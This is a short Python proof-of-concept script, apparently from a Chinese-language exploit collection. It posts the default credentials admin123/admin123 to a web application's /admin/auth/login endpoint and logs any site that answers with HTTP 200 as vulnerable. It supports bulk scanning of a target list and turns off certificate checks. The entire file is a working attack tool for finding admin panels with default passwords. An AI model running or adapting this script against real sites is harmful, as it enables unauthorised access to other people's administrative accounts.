import requests
import sys
import argparse
import urllib
def checkVuln(url):
    vulnurl = url+'/admin/auth/login'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
    }
    data = '''{"username":"admin123","password":"admin123","code":""}'''
    res=requests.post(vulnurl,headers=headers,data=data,verify=False)
    try:
        if res.status_code==200:
            print(f"[+]当前网址存在漏洞:{url}")
            with open("vuln5.txt", "a+") as f:
                f.write(vulnurl + "\n")
        else:
            print("[-]当前网站不存在漏洞")
    except Exception as e:
        print("[-]当前网站存在连接问题")
def batchCheck(filename):
    with open(filename,"r") as f:
        for readline in f.readlines():
            url=readline.replace('\n','')
            checkVuln(url)
def banner():
    bannerinfo='''_________ _______  _______  _        _______  _______  _______
\__   __/(  ___  )(  ___  )( \      (  ____ )(  ___  )(  ____ \
   ) (   | (   ) || (   ) || (      | (    )|| (   ) || (    \/
   | |   | |   | || |   | || |      | (____)|| |   | || |
   | |   | |   | || |   | || |      |  _____)| |   | || |
   | |   | |   | || |   | || |      | (      | |   | || |
   | |   | (___) || (___) || (____/\| )      | (___) || (____/\
   )_(   (_______)(_______)(_______/|/       (_______)(_______/


'''
    print(bannerinfo)
    print("toolpoc".center(50,'*'))
    print(f"[+]{sys.argv[0]} --url http://www.xxx.com 进行单个url漏洞检测")
    print(f"[+]{sys.argv[0]} --file targeturl.txt 对文本中的url进行批量检测")
    print(f"[+]{sys.argv[0]} --help 查看帮助")
def main():
    parser=argparse.ArgumentParser(description='漏洞检测脚本')
    parser.add_argument('-u','--url',type=str,help='单个url')
    parser.add_argument('-f','--file',type=str,help='批量检测url')
    args=parser.parse_args()
    if args.url:
        checkVuln(args.url)
    elif args.file:
        batchCheck(args.file)
    else:
        banner()
if __name__ == '__main__':
    main()